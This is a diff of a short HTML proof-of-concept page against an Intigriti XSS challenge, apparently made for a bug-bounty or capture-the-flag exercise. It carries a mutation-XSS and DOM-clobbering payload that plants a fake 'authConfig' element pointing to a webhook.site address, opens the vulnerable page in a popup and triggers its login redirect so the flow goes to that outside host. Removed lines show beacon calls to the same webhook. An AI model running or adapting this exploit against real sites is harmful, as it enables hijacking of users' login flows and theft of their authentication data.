@@ -2,20 +2,24 @@
 <html>
 <body>
 <script>
-const id = Math.random().toString(36).slice(2);
 const payload = `<form><h1></form><img name="authConfig" data-next="https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c" data-append="true"><table><form></form></table></form></table></h1></form><math><mi><style><!--</style><style title="--></style><img src=x>"></style></mi></math>`;
 const vulnUrl = 'https://challenge-0326.intigriti.io/challenge.html?q=' + encodeURIComponent(payload);
 
-fetch('https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c?step=loaded&id=' + id, {mode: 'no-cors'});
+const w = window.open(vulnUrl, '_blank');
 
-let w = null;
-try {
-  w = window.open(vulnUrl, '_blank');
-  fetch('https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c?step=popup&id=' + id + '&ok=' + (!!w), {mode: 'no-cors'});
-} catch (e) {
-  fetch('https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c?step=popup_err&id=' + id, {mode: 'no-cors'});
-}
+setTimeout(() => {
+  try {
+    // 🔥 ВАЖЛИВО: не javascript:, а прямий виклик
+    w.Auth.loginRedirect(1);
+  } catch (e) {
+    // fallback якщо race condition
+    setTimeout(() => {
+      try {
+        w.Auth.loginRedirect(1);
+      } catch(e){}
+    }, 1000);
+  }
+}, 2000);
 </script>
-OK
 </body>
 </html>
